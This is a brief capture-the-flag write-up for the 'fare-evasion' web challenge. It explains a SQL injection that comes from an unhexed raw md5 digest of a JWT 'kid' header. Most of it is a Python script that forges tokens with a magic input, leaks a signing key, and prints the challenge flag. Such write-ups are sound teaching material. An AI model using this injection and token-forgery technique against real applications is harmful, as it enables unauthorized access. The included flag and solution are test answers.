https://ctftime.org/event/2275

# fare-evasion (web)

Unusual sqli challenge

## Solution
The bug happens because of not calling `.hex()` on the result of the md5
So if we can find some hash with `'1=1` or something like that we can dump the whole db
Fortunately someone already wrote about that a decade ago:
https://cvk.posthaven.com/sql-injection-with-raw-md5-hashes

```python
#!/usr/bin/env python3
import requests
import jwt
import hashlib

REMOTE = "https://fare-evasion.chal.uiuc.tf/pay"

sqli = '129581926211651571912466741651878684928'

j = jwt.encode(
    {"type": "passenger"},
    key='a_boring_passenger_signing_key_?',
    algorithm="HS256",
    headers={"kid": sqli, "typ": "JWT"},
)
res = requests.post(REMOTE, cookies={'access_token': j})

ck = "conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e"

j = jwt.encode(
    {"type": "passenger"},
    key=ck,
    algorithm="HS256",
    headers={"kid": "conductor_key", "typ": "JWT"},
)

res = requests.post(REMOTE, cookies={'access_token': j})
print(f"DEBUGPRINT[2]: lab.py:28: res.text={res.text}")
```

## Flag
`uiuctf{sigpwny_does_not_condone_turnstile_hopping!}`

shafouz 2024/06/29
